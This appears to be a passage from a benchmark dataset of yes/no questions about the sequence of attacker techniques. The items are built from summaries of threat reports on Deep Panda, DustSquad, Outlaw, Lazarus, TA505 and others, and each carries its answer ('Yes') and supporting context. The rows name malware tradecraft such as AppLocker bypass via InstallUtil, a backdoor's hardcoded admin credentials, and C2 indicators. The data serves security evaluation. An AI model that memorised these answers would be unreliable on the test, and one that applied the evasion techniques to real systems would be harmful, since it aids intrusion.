Privilege Escalation: The 2016 version of the Milestone backdoor creates a new administrator user with the username ANONYMOUS and password MileSt0ne2@16, executes another instance of itself with CreateProcessAsUser, and then removes the user from the system.
Discovery: The Milestone backdoor has capabilities for system information discovery, file and directory discovery, and screen capture.
Command and Control: The Milestone backdoor communicates with a C2 server uncompressed, unlike the zlib-compressed communication of Gh0st RAT. It also supports a command that sends information about the current sessions on the system to the server.
Exfiltration: The Milestone backdoor exfiltrates data over the C2 channel.
Others: The campaign's attribution to Deep Panda and Winnti is based on the use of the Milestone backdoor, previously known as Infoadmin RAT, and the Fire Chili rootkit, both of which share similarities with tools used by these groups in the past. The use of stolen certificates and C2 infrastructure suggests possible resource sharing between the groups. FortiEDR detects and blocks these threats, and all network IOCs have been added to the FortiGuard WebFiltering blocklist.",Yes,New Milestones for Deep Panda_ Log4Shell and Digitally Signed Fire Chili Rootkits
2539,48,48-Discovery-T1082-System Information Discovery,"After using PowerShell scripts and batch files to execute the Milestone backdoor on infected systems, is it likely that Deep Panda would perform system information discovery before utilizing the backdoor to communicate uncompressed with a C2 server?","Discovery: The Milestone backdoor has capabilities for system information discovery, file and directory discovery, and screen capture.","Resource Development: During the past month, FortiEDR detected a campaign by Deep Panda, a Chinese APT group, which exploited the Log4Shell vulnerability in VMware Horizon servers. The group targeted multiple sectors, including financial, academic, cosmetics, and travel industries, across several countries. Deep Panda deployed a backdoor on infected machines and used a stolen digital certificate, also utilized by another Chinese APT group, Winnti, to sign their tools.
Initial Access: Deep Panda gained initial access through the exploitation of the Log4Shell vulnerability in VMware Horizon servers. This allowed them to spawn new PowerShell processes to download and execute a chain of scripts, culminating in the installation of a malicious DLL.
Execution: The attack chain involved the execution of PowerShell scripts and a batch file to download and run additional files, including syn.exe and 1.dll. The 1.dll module, dubbed Milestone, is a backdoor based on Gh0st RAT/Netbot Attacker's leaked source code and packed with Themida. It creates a service named msupdate2 and masquerades as the legitimate Microsoft newdev.dll.
Persistence: The Milestone backdoor ensures persistence by copying itself to %APPDATA%\newdev.dll and creating a service named msupdate2 directly in the registry. This service is registered with various names and descriptions across different samples.
Privilege Escalation: The 2016 version of the Milestone backdoor creates a new administrator user with the username ANONYMOUS and password MileSt0ne2@16, executes another instance of itself with CreateProcessAsUser, and then removes the user from the system.
Defense Evasion: Deep Panda's campaign involved the use of a novel kernel rootkit, Fire Chili, which hides and protects malicious artifacts, including files, processes, registry keys, and network connections. The rootkit uses Direct Kernel Object Modification (DKOM) and is signed with stolen certificates from game development companies. It also employs Themida for software packing and masquerading techniques to evade detection.
Command and Control: The Milestone backdoor communicates with a C2 server uncompressed, unlike the zlib-compressed communication of Gh0st RAT. It also supports a command that sends information about the current sessions on the system to the server.
Exfiltration: The Milestone backdoor exfiltrates data over the C2 channel.
Others: The campaign's attribution to Deep Panda and Winnti is based on the use of the Milestone backdoor, previously known as Infoadmin RAT, and the Fire Chili rootkit, both of which share similarities with tools used by these groups in the past. The use of stolen certificates and C2 infrastructure suggests possible resource sharing between the groups. FortiEDR detects and blocks these threats, and all network IOCs have been added to the FortiGuard WebFiltering blocklist.",Yes,New Milestones for Deep Panda_ Log4Shell and Digitally Signed Fire Chili Rootkits
2541,48,48-Execution-T1059-Command and Scripting Interpreter,"After gaining initial access by exploiting the Log4Shell vulnerability in VMware Horizon servers and spawning PowerShell processes to download and execute scripts, is it likely that Deep Panda will execute PowerShell scripts and a batch file to perform tasks such as downloading and running additional files before ensuring persistence by copying the Milestone backdoor to %APPDATA%\newdev.dll and creating a registry-based service named msupdate2?","Execution: The attack chain involved the execution of PowerShell scripts and a batch file to download and run additional files, including syn.exe and 1.dll. The 1.dll module, dubbed Milestone, is a backdoor based on Gh0st RAT/Netbot Attacker's leaked source code and packed with Themida. It creates a service named msupdate2 and masquerades as the legitimate Microsoft newdev.dll.","Resource Development: During the past month, FortiEDR detected a campaign by Deep Panda, a Chinese APT group, which exploited the Log4Shell vulnerability in VMware Horizon servers. The group targeted multiple sectors, including financial, academic, cosmetics, and travel industries, across several countries. Deep Panda deployed a backdoor on infected machines and used a stolen digital certificate, also utilized by another Chinese APT group, Winnti, to sign their tools.
Initial Access: Deep Panda gained initial access through the exploitation of the Log4Shell vulnerability in VMware Horizon servers. This allowed them to spawn new PowerShell processes to download and execute a chain of scripts, culminating in the installation of a malicious DLL.
Persistence: The Milestone backdoor ensures persistence by copying itself to %APPDATA%\newdev.dll and creating a service named msupdate2 directly in the registry. This service is registered with various names and descriptions across different samples.
Privilege Escalation: The 2016 version of the Milestone backdoor creates a new administrator user with the username ANONYMOUS and password MileSt0ne2@16, executes another instance of itself with CreateProcessAsUser, and then removes the user from the system.
Defense Evasion: Deep Panda's campaign involved the use of a novel kernel rootkit, Fire Chili, which hides and protects malicious artifacts, including files, processes, registry keys, and network connections. The rootkit uses Direct Kernel Object Modification (DKOM) and is signed with stolen certificates from game development companies. It also employs Themida for software packing and masquerading techniques to evade detection.
Discovery: The Milestone backdoor has capabilities for system information discovery, file and directory discovery, and screen capture.
Command and Control: The Milestone backdoor communicates with a C2 server uncompressed, unlike the zlib-compressed communication of Gh0st RAT. It also supports a command that sends information about the current sessions on the system to the server.
Exfiltration: The Milestone backdoor exfiltrates data over the C2 channel.
Others: The campaign's attribution to Deep Panda and Winnti is based on the use of the Milestone backdoor, previously known as Infoadmin RAT, and the Fire Chili rootkit, both of which share similarities with tools used by these groups in the past. The use of stolen certificates and C2 infrastructure suggests possible resource sharing between the groups. FortiEDR detects and blocks these threats, and all network IOCs have been added to the FortiGuard WebFiltering blocklist.",Yes,New Milestones for Deep Panda_ Log4Shell and Digitally Signed Fire Chili Rootkits
2542,48,48-Command and Control-T1071-Application Layer Protocol,"After employing system information discovery and screen capture capabilities, is it likely that the Milestone backdoor will communicate with a C2 server over the application layer protocol before exfiltrating data through the same C2 channel?","Command and Control: The Milestone backdoor communicates with a C2 server uncompressed, unlike the zlib-compressed communication of Gh0st RAT. It also supports a command that sends information about the current sessions on the system to the server.","Resource Development: During the past month, FortiEDR detected a campaign by Deep Panda, a Chinese APT group, which exploited the Log4Shell vulnerability in VMware Horizon servers. The group targeted multiple sectors, including financial, academic, cosmetics, and travel industries, across several countries. Deep Panda deployed a backdoor on infected machines and used a stolen digital certificate, also utilized by another Chinese APT group, Winnti, to sign their tools.
Initial Access: Deep Panda gained initial access through the exploitation of the Log4Shell vulnerability in VMware Horizon servers. This allowed them to spawn new PowerShell processes to download and execute a chain of scripts, culminating in the installation of a malicious DLL.
Execution: The attack chain involved the execution of PowerShell scripts and a batch file to download and run additional files, including syn.exe and 1.dll. The 1.dll module, dubbed Milestone, is a backdoor based on Gh0st RAT/Netbot Attacker's leaked source code and packed with Themida. It creates a service named msupdate2 and masquerades as the legitimate Microsoft newdev.dll.
Persistence: The Milestone backdoor ensures persistence by copying itself to %APPDATA%\newdev.dll and creating a service named msupdate2 directly in the registry. This service is registered with various names and descriptions across different samples.
Privilege Escalation: The 2016 version of the Milestone backdoor creates a new administrator user with the username ANONYMOUS and password MileSt0ne2@16, executes another instance of itself with CreateProcessAsUser, and then removes the user from the system.
Defense Evasion: Deep Panda's campaign involved the use of a novel kernel rootkit, Fire Chili, which hides and protects malicious artifacts, including files, processes, registry keys, and network connections. The rootkit uses Direct Kernel Object Modification (DKOM) and is signed with stolen certificates from game development companies. It also employs Themida for software packing and masquerading techniques to evade detection.
Discovery: The Milestone backdoor has capabilities for system information discovery, file and directory discovery, and screen capture.
Exfiltration: The Milestone backdoor exfiltrates data over the C2 channel.
Others: The campaign's attribution to Deep Panda and Winnti is based on the use of the Milestone backdoor, previously known as Infoadmin RAT, and the Fire Chili rootkit, both of which share similarities with tools used by these groups in the past. The use of stolen certificates and C2 infrastructure suggests possible resource sharing between the groups. FortiEDR detects and blocks these threats, and all network IOCs have been added to the FortiGuard WebFiltering blocklist.",Yes,New Milestones for Deep Panda_ Log4Shell and Digitally Signed Fire Chili Rootkits
2544,48,48-Exfiltration-T1041-Exfiltration Over C2 Channel,Is it likely that the Milestone backdoor will exfiltrate data over the C2 channel after discovering system information and capturing the screen on the infected system using its discovery capabilities?,Exfiltration: The Milestone backdoor exfiltrates data over the C2 channel.,"Resource Development: During the past month, FortiEDR detected a campaign by Deep Panda, a Chinese APT group, which exploited the Log4Shell vulnerability in VMware Horizon servers. The group targeted multiple sectors, including financial, academic, cosmetics, and travel industries, across several countries. Deep Panda deployed a backdoor on infected machines and used a stolen digital certificate, also utilized by another Chinese APT group, Winnti, to sign their tools.
Initial Access: Deep Panda gained initial access through the exploitation of the Log4Shell vulnerability in VMware Horizon servers. This allowed them to spawn new PowerShell processes to download and execute a chain of scripts, culminating in the installation of a malicious DLL.
Execution: The attack chain involved the execution of PowerShell scripts and a batch file to download and run additional files, including syn.exe and 1.dll. The 1.dll module, dubbed Milestone, is a backdoor based on Gh0st RAT/Netbot Attacker's leaked source code and packed with Themida. It creates a service named msupdate2 and masquerades as the legitimate Microsoft newdev.dll.
Persistence: The Milestone backdoor ensures persistence by copying itself to %APPDATA%\newdev.dll and creating a service named msupdate2 directly in the registry. This service is registered with various names and descriptions across different samples.
Privilege Escalation: The 2016 version of the Milestone backdoor creates a new administrator user with the username ANONYMOUS and password MileSt0ne2@16, executes another instance of itself with CreateProcessAsUser, and then removes the user from the system.
Defense Evasion: Deep Panda's campaign involved the use of a novel kernel rootkit, Fire Chili, which hides and protects malicious artifacts, including files, processes, registry keys, and network connections. The rootkit uses Direct Kernel Object Modification (DKOM) and is signed with stolen certificates from game development companies. It also employs Themida for software packing and masquerading techniques to evade detection.
Discovery: The Milestone backdoor has capabilities for system information discovery, file and directory discovery, and screen capture.
Command and Control: The Milestone backdoor communicates with a C2 server uncompressed, unlike the zlib-compressed communication of Gh0st RAT. It also supports a command that sends information about the current sessions on the system to the server.
Others: The campaign's attribution to Deep Panda and Winnti is based on the use of the Milestone backdoor, previously known as Infoadmin RAT, and the Fire Chili rootkit, both of which share similarities with tools used by these groups in the past. The use of stolen certificates and C2 infrastructure suggests possible resource sharing between the groups. FortiEDR detects and blocks these threats, and all network IOCs have been added to the FortiGuard WebFiltering blocklist.",Yes,New Milestones for Deep Panda_ Log4Shell and Digitally Signed Fire Chili Rootkits
2551,49,49-Command and Control-T1071-Application Layer Protocol,"After gathering JSON-formatted system data and fingerprinting the victim using WMIC.exe during the Discovery stage, is the Octopus network module likely to communicate with C2 servers, consisting of hardcoded IP addresses, and receive commands from the C2 server during the Command and Control stage?","Command and Control: The Octopus network module communicates with C2 servers using JSON-formatted data and the HTTP protocol. It consists of hardcoded IP addresses of commercial web-hosting services and deploys first-stage .php scripts to check connections and obtain the actual C2 server domain name. The malware receives commands from the C2 server, including uploading/downloading files and taking screenshots.","Initial Access: In April 2018, a new Octopus sample was discovered, masquerading as communication software for a Kazakh opposition political group. The malware, named Octopus, was packed in a ZIP file called dvkmailer.zip, with a timestamp indicating it was created between February and March 2018. The ZIP file contained a fake Telegram Messenger with a Russian interface, designed to exploit the potential Telegram ban in Kazakhstan. The dropper, which pretends to be legitimate software, was found to use third-party Delphi libraries for JSON-based C2 communications and TurboPower Abbrevia for compression. The malware achieves persistence through the system registry, and the server side utilizes commercial hosting with .php scripts deployed. The distribution method of the malware is unclear, but it likely involves social engineering, as the actor previously used spear phishing.
Execution: Upon execution, the Octopus launcher checks for the presence of a file named TelegramApi.dll in the same directory. If found, it copies the network module to the startup directory as Java.exe and runs it. The launcher, which is a Delphi Visual Component Library (VCL) program, has only three programmer-defined handlers for controlling elements, with no handler for the 'Send mailing' button, suggesting the malware may be unfinished or created in haste without communication features.
Persistence: The Octopus malware achieves persistence by copying the network module to the startup directory and running it as Java.exe. This is done through the FormCreate() function of the launcher before any user interaction.
Credential Access: The Octopus developers utilized the password dumping utility fgdump as part of their operations.
Discovery: The network module of Octopus gathers JSON-formatted system data, including disk name and size, computer and user name, Windows directory, host IP, and more. It uses the Windows Management Instrumentation mechanism to fingerprint the victim by running WMIC.exe with specific arguments to collect system information, which is then hashed using MD5 to create a unique victim ID.
Others: The CTI report by GReAT from Kaspersky Lab details the activities of a Russian-language cyberespionage actor named DustSquad, which has been targeting Central Asian users and diplomatic entities since 2014. The actor's malware, Octopus, is related to DustSquad and uses Delphi as the programming language. The report includes technical details of the malware, its infrastructure, and indicators of compromise, including file hashes, domains, IPs, and auxiliary URLs for file upload/download. The report also mentions other threat actors such as IndigoZebra and Sofacy (with Zebrocy malware) targeting the region. The interest in Central Asia by threat actors is noted to be high, with DustSquad being a relatively new local player.",Yes,Russian-language actor exploits hype over Telegram ban in Central Asia
2563,50,50-Command and Control-T1071-Application Layer Protocol,"After gathering information about the infected host, such as the number of processor cores, type of processor, and whether monitoring tools like Splunk or antivirus solutions are installed, is the Shellbot likely to establish C&C communication by using an IRC channel?","Command and Control: The Shellbot establishes C&C communication immediately after infection and maintains it. The IRC channel is used to send various commands to the host, including commands for port scanning, DDoS attacks, file downloads, and obtaining information about other machines.","Initial Access: The Outlaw hacking group, using the Perl-based Shellbot, compromised an FTP server of a Japanese art institution and a Bangladeshi government site by exploiting a vulnerability on Dovecot mail server. They then linked two compromised servers to a high availability cluster to host an IRC bouncer for command and control.
Execution: The Shellbot, written in Perl, is distributed by exploiting a command injection vulnerability on IoT devices and Linux servers. It can also affect Windows environments and Android devices. The botnet was previously spread via the Shellshock vulnerability but now is mostly distributed via brute-forced or compromised hosts.
Persistence: Once installed, the Shellbot communicates persistently with the C&C servers via IRC. Restarting the infected machine does not revert the changes done to the system.
Defense Evasion: The Shellbot assigns hardcoded process names to hide from system admins, security monitoring, and researchers. It also uses PING/PONG communication to keep the IRC channel open and avoid disconnection.
Discovery: The Shellbot gathers information about the infected host, such as the number of processor cores, type of processor, and whether monitoring tools like Splunk or antivirus solutions are installed.
Others: The Outlaw group's operation involves targeting organizations for cybercriminal purposes using DoS and SSH brute force attacks. The group operates mostly during business hours, suggesting a daily operation schedule. Security measures recommended include proper SSH setup, CLI command monitoring, non-DNS traffic monitoring, account creation detection, FTP usage restriction, Dovecot mail server vulnerability patching, and maintaining contact for security compromise reporting. Trend Micro's XGen security provides protection against such threats.",Yes,Perl-Based Shellbot Looks to Target Organizations via C&C - TrendLabs Security Intelligence Blog
2567,51,51-Persistence-T1547-Boot or Logon Autostart Execution,"Before achieving persistence by writing itself to %SYSTEM%\WSPsvc.dll and installing as a service to run the exported function 'ServiceMain', is it likely that the Emissary Trojan would compromise legitimate websites to host its malware for initial access?","Persistence: The Emissary Trojan is capable of maintaining persistence on a targeted system. It achieves this by writing itself to %SYSTEM%\WSPsvc.dll and installing as a service to run the exported function 'ServiceMain'. Additionally, it creates registry keys to store encrypted configuration and a unique GUID for the compromised host. Persistence is also achieved through various methods such as hijacking legitimate services or adding startup code, depending on the user's permissions.","Initial Access: The CTI report indicates that the threat actors behind the Emissary Trojan, associated with Operation Lotus Blossom, shifted their tactics from solely using spear-phishing with attachments to also compromising legitimate websites to host their malware. This shift in tactics suggests an adaptation to increase the odds of successful infiltration.
Defense Evasion: Emissary Trojan authors have made several updates to the malware to evade detection. These updates include changes in configuration storage, handling of commands, and the introduction of large file sizes to avoid antivirus scanning. The actors also recompiled the Trojan without changes to avoid detection based on PE header hashes.
Command and Control: The Emissary Trojan communicates with command and control (C2) servers using HTTP requests. It typically has three hardcoded C2s that are a mix of IPs and domain names. The C2 infrastructure used by Emissary is somewhat different from that used by the related Elise Trojan. The report includes a full list of Indicators of Compromise (IOCs) related to the C2 infrastructure.
Others: The CTI report details the evolution of the Emissary Trojan, which has been in use since 2009 and is related to the Elise Trojan and Operation Lotus Blossom campaign. The report provides a timeline of the development efforts and changes made to the Emissary Trojan over the years, including the creation of multiple versions with iterative changes. The report also notes that the development effort for Emissary significantly increased after the publication of the Operation Lotus Blossom report in June 2015, resulting in many new versions of the Trojan. Additionally, the report includes a changelog section discussing the observed changes between each version of Emissary, highlighting the malware's capability to exfiltrate files, download and execute additional payloads, and gain remote shell access. The report concludes that the actors behind Emissary have been active for at least seven years, targeting primarily military or government entities in Southeast Asia, with a focus on Taiwan and Hong Kong. The report also includes a list of Emissary delivery documents, installers/loaders, DLL versions, C2 URLs, and campaign codes.",Yes,emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve
2571,52,52-Defense Evasion-T1027-Obfuscated Files or Information,"After the detected suspicious email containing a Word document with a macro dropper designed to execute a JavaScript payload, is it likely that the attacker used obfuscation techniques to hinder the analysis process before the final JavaScript downloader dropped a file from a specified URL and executed it in the system's temporary directory?","Defense Evasion: The attacker used obfuscation techniques in the VBA-Macro to decode the JavaScript payload, making the analysis process more challenging. The obfuscated code contained thematically chosen variable names such as 'theseus', 'pastorale', and 'quetzalcoatl'. The final JavaScript downloader was designed to drop a file from a specified URL into the system's temporary directory and execute it.","Initial Access: During a normal monitoring activity, a suspicious email from the domain validtree.com was detected, which was registered through namecheap.com and protected by a Panama company named WhoisGuard. The domain recently renewed and currently resolves to an IP address assigned to LeaseWeb, a VPS hosting provider located in the Netherlands. The email contained a suspicious Word document with a macro dropper designed to execute a JavaScript payload.
Execution: The Word document contained two VBA-Macro functions, 'AutoOpen' and 'HeadrFooterProperty', which decoded a JavaScript payload. The payload was obfuscated to hinder analysis and used a XOR key to decode a third JavaScript stage that communicated with the IP 66.133.129.5, assigned to Frontier Communications Solutions.
Command and Control: The final JavaScript downloader aimed to drop a file from a URL, placing it into the system's temporary directory and naming it 'nanagrams.exe', which would then be executed on the victim's machine. The dropping URL contained a 'surprise.php' file, which due to a misconfiguration, revealed its source code showing visitor tracking through an iframe pointing to another domain and redirecting the downloader script to different URLs.
Others: The suspicious email targeted System Integrator Companies in Europe. The infrastructure used in the attack suggests the involvement of the cybercrime group TA505, known for operating the Dridex and Locky malware families. The group has been active since 2014, focusing on Retail and banking sectors. The attack used an old infrastructure previously associated with Ransomware propagation. The IoC includes a hash and several URLs related to the attack. A Yara rule was provided to help identify similar attacks.",Yes,TA-505 Cybercrime on System Integrator Companies
2572,52,52-Command and Control-T1071-Application Layer Protocol,"After utilizing obfuscated VBA-Macro functions to decode JavaScript payloads and drop a file into the system's temporary directory, is it likely that the JavaScript downloader will drop a file named 'nanagrams.exe' from a URL while 'surprise.php' reveals its source code showing visitor tracking through an iframe?","Command and Control: The final JavaScript downloader aimed to drop a file from a URL, placing it into the system's temporary directory and naming it 'nanagrams.exe', which would then be executed on the victim's machine. The dropping URL contained a 'surprise.php' file, which due to a misconfiguration, revealed its source code showing visitor tracking through an iframe pointing to another domain and redirecting the downloader script to different URLs.","Initial Access: During a normal monitoring activity, a suspicious email from the domain validtree.com was detected, which was registered through namecheap.com and protected by a Panama company named WhoisGuard. The domain recently renewed and currently resolves to an IP address assigned to LeaseWeb, a VPS hosting provider located in the Netherlands. The email contained a suspicious Word document with a macro dropper designed to execute a JavaScript payload.
Execution: The Word document contained two VBA-Macro functions, 'AutoOpen' and 'HeadrFooterProperty', which decoded a JavaScript payload. The payload was obfuscated to hinder analysis and used a XOR key to decode a third JavaScript stage that communicated with the IP 66.133.129.5, assigned to Frontier Communications Solutions.
Defense Evasion: The attacker used obfuscation techniques in the VBA-Macro to decode the JavaScript payload, making the analysis process more challenging. The obfuscated code contained thematically chosen variable names such as 'theseus', 'pastorale', and 'quetzalcoatl'. The final JavaScript downloader was designed to drop a file from a specified URL into the system's temporary directory and execute it.
Others: The suspicious email targeted System Integrator Companies in Europe. The infrastructure used in the attack suggests the involvement of the cybercrime group TA505, known for operating the Dridex and Locky malware families. The group has been active since 2014, focusing on Retail and banking sectors. The attack used an old infrastructure previously associated with Ransomware propagation. The IoC includes a hash and several URLs related to the attack. A Yara rule was provided to help identify similar attacks.",Yes,TA-505 Cybercrime on System Integrator Companies
2575,53,53-Defense Evasion-T1127-Trusted Developer Utilities Proxy Execution,"After creating a scheduled task with appropriate privileges to ensure persistence, is the malware likely to employ InstallUtil.exe to evade detection by bypassing Smartscreen and AppLocker during its execution for Defense Evasion?","Defense Evasion: The malware employed a technique using InstallUtil.exe, a legitimate .NET tool, to avoid detection by Smartscreen and Applocker. The DLL was 'uninstalled' using InstallUtil.exe with the '/u' command, which paradoxically installed the malware. The .DAT file generated by the script was a DLL file compiled with .NET that contained the payload and was injected into memory.","Initial Access: A malware was sent to email accounts belonging to a Vietnam government domain on March 13th, 2019. The email, written in Vietnamese, appeared to originate from an internal account (gov.vn) and was flagged as suspicious. The malware was delivered via a zip file attachment that contained a .lnk file simulating a document icon, a technique known to be used by attackers but not widely popular.
Execution: The .lnk file's target property contained MS-DOS obfuscated code that, when executed, would carve out a base64 encoded PowerShell script named s.ps1 and save it in the %TEMP% directory. This PowerShell script was designed to execute another PowerShell script in memory, which would then run a WScript Shell. The WScript Shell created three files: a decoy DOC file, a legitimate tool for installing .NET assembled files to bypass SmartScreen and AppLocker protection, and a .NET DLL file containing the actual malicious payload.
Persistence: The PowerShell script checked for administrative privileges and copied the DLL file to WINDIR\debug\ or %TEMP% accordingly. It then created a scheduled task with SYSTEM privileges if the user was an administrator, or with lower privileges otherwise. The malware also checked for the presence of Kaspersky antivirus and adjusted its behavior accordingly, either running a VBS script or renaming it to TXT and executing it with wbscript /E:vbscript.
Command and Control: The payload was identified as a Cobalt Strike beacon, evident from its communication pattern with the command and control server.
Others: The attack targeted the Vietnamese government using a combination of sophisticated techniques. The use of a .LNK file helped evade sandboxes, and the obfuscation techniques kept the malware under the radar. The execution technique allowed the malware to evade Endpoint Detection and Response (EDR) systems by loading through a legitimate binary and working in memory for deobfuscation and injection. The infrastructure used in this attack was not associated with any other known attacks. Indicators of Compromise (IOCs) include the IP address 144.202.54.86, hashes 0476ec8b4cb1b5dd368be52d9249f5b3cf6709b3141e9d02814c05f61cb90a91, 89fdef30c14db09e4e82c561db4a35cbc039b95bdfa6340546f7ee54b887f59b, 52dc9be06e921276c9df828b6be6da994df667e25af03bdddcc6cfec1470f1d7, and the mutex GLOBAL_VMSytnSCg.",Yes,Docless Vietnam APT
2576,53,53-Defense Evasion-T1553-Subvert Trust Controls,"After creating a scheduled task with SYSTEM privileges or lower privileges based on user rights for persistence, is it likely that the malware will generate a DLL file from the .DAT file using InstallUtil.exe as part of its defense evasion strategy?","Defense Evasion: The malware employed a technique using InstallUtil.exe, a legitimate .NET tool, to avoid detection by Smartscreen and Applocker. The DLL was 'uninstalled' using InstallUtil.exe with the '/u' command, which paradoxically installed the malware. The .DAT file generated by the script was a DLL file compiled with .NET that contained the payload and was injected into memory.","Initial Access: A malware was sent to email accounts belonging to a Vietnam government domain on March 13th, 2019. The email, written in Vietnamese, appeared to originate from an internal account (gov.vn) and was flagged as suspicious. The malware was delivered via a zip file attachment that contained a .lnk file simulating a document icon, a technique known to be used by attackers but not widely popular.
Execution: The .lnk file's target property contained MS-DOS obfuscated code that, when executed, would carve out a base64 encoded PowerShell script named s.ps1 and save it in the %TEMP% directory. This PowerShell script was designed to execute another PowerShell script in memory, which would then run a WScript Shell. The WScript Shell created three files: a decoy DOC file, a legitimate tool for installing .NET assembled files to bypass SmartScreen and AppLocker protection, and a .NET DLL file containing the actual malicious payload.
Persistence: The PowerShell script checked for administrative privileges and copied the DLL file to WINDIR\debug\ or %TEMP% accordingly. It then created a scheduled task with SYSTEM privileges if the user was an administrator, or with lower privileges otherwise. The malware also checked for the presence of Kaspersky antivirus and adjusted its behavior accordingly, either running a VBS script or renaming it to TXT and executing it with wbscript /E:vbscript.
Command and Control: The payload was identified as a Cobalt Strike beacon, evident from its communication pattern with the command and control server.
Others: The attack targeted the Vietnamese government using a combination of sophisticated techniques. The use of a .LNK file helped evade sandboxes, and the obfuscation techniques kept the malware under the radar. The execution technique allowed the malware to evade Endpoint Detection and Response (EDR) systems by loading through a legitimate binary and working in memory for deobfuscation and injection. The infrastructure used in this attack was not associated with any other known attacks. Indicators of Compromise (IOCs) include the IP address 144.202.54.86, hashes 0476ec8b4cb1b5dd368be52d9249f5b3cf6709b3141e9d02814c05f61cb90a91, 89fdef30c14db09e4e82c561db4a35cbc039b95bdfa6340546f7ee54b887f59b, 52dc9be06e921276c9df828b6be6da994df667e25af03bdddcc6cfec1470f1d7, and the mutex GLOBAL_VMSytnSCg.",Yes,Docless Vietnam APT
2578,53,53-Persistence-T1053-Scheduled Task/Job,"After the .lnk file delivers its payload and the PowerShell script obfuscates its execution in memory, is it likely that the malware will establish persistence by creating a scheduled task with appropriate privileges after checking for administrative rights and copying the DLL file to the designated directory?","Persistence: The PowerShell script checked for administrative privileges and copied the DLL file to WINDIR\debug\ or %TEMP% accordingly. It then created a scheduled task with SYSTEM privileges if the user was an administrator, or with lower privileges otherwise. The malware also checked for the presence of Kaspersky antivirus and adjusted its behavior accordingly, either running a VBS script or renaming it to TXT and executing it with wbscript /E:vbscript.","Initial Access: A malware was sent to email accounts belonging to a Vietnam government domain on March 13th, 2019. The email, written in Vietnamese, appeared to originate from an internal account (gov.vn) and was flagged as suspicious. The malware was delivered via a zip file attachment that contained a .lnk file simulating a document icon, a technique known to be used by attackers but not widely popular.
Execution: The .lnk file's target property contained MS-DOS obfuscated code that, when executed, would carve out a base64 encoded PowerShell script named s.ps1 and save it in the %TEMP% directory. This PowerShell script was designed to execute another PowerShell script in memory, which would then run a WScript Shell. The WScript Shell created three files: a decoy DOC file, a legitimate tool for installing .NET assembled files to bypass SmartScreen and AppLocker protection, and a .NET DLL file containing the actual malicious payload.
Defense Evasion: The malware employed a technique using InstallUtil.exe, a legitimate .NET tool, to avoid detection by Smartscreen and Applocker. The DLL was 'uninstalled' using InstallUtil.exe with the '/u' command, which paradoxically installed the malware. The .DAT file generated by the script was a DLL file compiled with .NET that contained the payload and was injected into memory.
Command and Control: The payload was identified as a Cobalt Strike beacon, evident from its communication pattern with the command and control server.
Others: The attack targeted the Vietnamese government using a combination of sophisticated techniques. The use of a .LNK file helped evade sandboxes, and the obfuscation techniques kept the malware under the radar. The execution technique allowed the malware to evade Endpoint Detection and Response (EDR) systems by loading through a legitimate binary and working in memory for deobfuscation and injection. The infrastructure used in this attack was not associated with any other known attacks. Indicators of Compromise (IOCs) include the IP address 144.202.54.86, hashes 0476ec8b4cb1b5dd368be52d9249f5b3cf6709b3141e9d02814c05f61cb90a91, 89fdef30c14db09e4e82c561db4a35cbc039b95bdfa6340546f7ee54b887f59b, 52dc9be06e921276c9df828b6be6da994df667e25af03bdddcc6cfec1470f1d7, and the mutex GLOBAL_VMSytnSCg.",Yes,Docless Vietnam APT
2584,54,54-Command and Control-T1071-Application Layer Protocol,"After discovering system information such as the hostname, user details, and active TCP connections, is it likely that the malware communicates with the identified C&C servers at IP addresses 125.214.195.17 and 196.29.166.218 using application layer protocols?",Command and Control: The C&C servers for the malware are identified by the IP addresses 125.214.195.17 and 196.29.166.218. The malware communicates with the C&C using a beacon with the User-Agent resembling a Firefox browser on Windows.,"Initial Access: On 3rd February 2017, researchers at badcyber.com reported a series of attacks targeting Polish financial institutions, suspected to originate from the Polish Financial Supervision Authority's website (knf.gov[.]pl). The website code had been altered from at least 2016-10-07 to late January to download malicious JavaScript files from compromised domains sap.misapor[.]ch and eye-watch[.]in, leading to malware downloads on visitors' devices.
Execution: The malware, identified by the MD5 hash 85d316590edfb4212049c4490db08c4b and named gpsvc.exe, is a Win32 executable first seen on 2017-01-26. It is packed with 'Enigma Protector' and drops a known Lazarus group malware variant. The executable accepts command line arguments to list service names, open or set events, and drop/install DLLs under specified service names using an RC4 password derived from the provided password's MD5 hash.
Defense Evasion: The malware uses a commercial packer known as 'Enigma Protector' for defense evasion. Additionally, the malware executes a series of basic system information gathering commands and returns the results via the C&C, eye-watch[.]in, which may also serve as a defense evasion technique by mimicking normal system queries.
Discovery: The malware executes a series of commands to gather system information, including hostname, user information, system version, network configuration, active TCP connections, and more. The results are sent back to the C&C, eye-watch[.]in.
Others: Additional watering-hole attacks were observed on the Comisi\u00f3n Nacional Bancaria y de Valores (Mexico) and a state-owned bank in Uruguay. The eye-watch[.]in domain was used in these attacks and has been associated with other malicious activities, including the delivery of malware variants and a Silverlight exploit based on CVE-2016-0034. A list of 255 IP address strings was found in the exploit kit website code, likely used to filter traffic and deliver exploits only to specific subnets, primarily targeting financial institutions in Poland and Mexico.",Yes,lazarus-watering-hole-attacks.html
2587,54,54-Discovery-T1016-System Network Configuration Discovery,"After executing system information discovery commands and returning the results to the C&C server, is it likely that the malware will attempt communication with its C&C infrastructure using a beacon mimicking a Firefox browser on Windows as part of command and control activities?","Discovery: The malware executes a series of commands to gather system information, including hostname, user information, system version, network configuration, active TCP connections, and more. The results are sent back to the C&C, eye-watch[.]in.","Initial Access: On 3rd February 2017, researchers at badcyber.com reported a series of attacks targeting Polish financial institutions, suspected to originate from the Polish Financial Supervision Authority's website (knf.gov[.]pl). The website code had been altered from at least 2016-10-07 to late January to download malicious JavaScript files from compromised domains sap.misapor[.]ch and eye-watch[.]in, leading to malware downloads on visitors' devices.
Execution: The malware, identified by the MD5 hash 85d316590edfb4212049c4490db08c4b and named gpsvc.exe, is a Win32 executable first seen on 2017-01-26. It is packed with 'Enigma Protector' and drops a known Lazarus group malware variant. The executable accepts command line arguments to list service names, open or set events, and drop/install DLLs under specified service names using an RC4 password derived from the provided password's MD5 hash.
Defense Evasion: The malware uses a commercial packer known as 'Enigma Protector' for defense evasion. Additionally, the malware executes a series of basic system information gathering commands and returns the results via the C&C, eye-watch[.]in, which may also serve as a defense evasion technique by mimicking normal system queries.
Command and Control: The C&C servers for the malware are identified by the IP addresses 125.214.195.17 and 196.29.166.218. The malware communicates with the C&C using a beacon with the User-Agent resembling a Firefox browser on Windows.
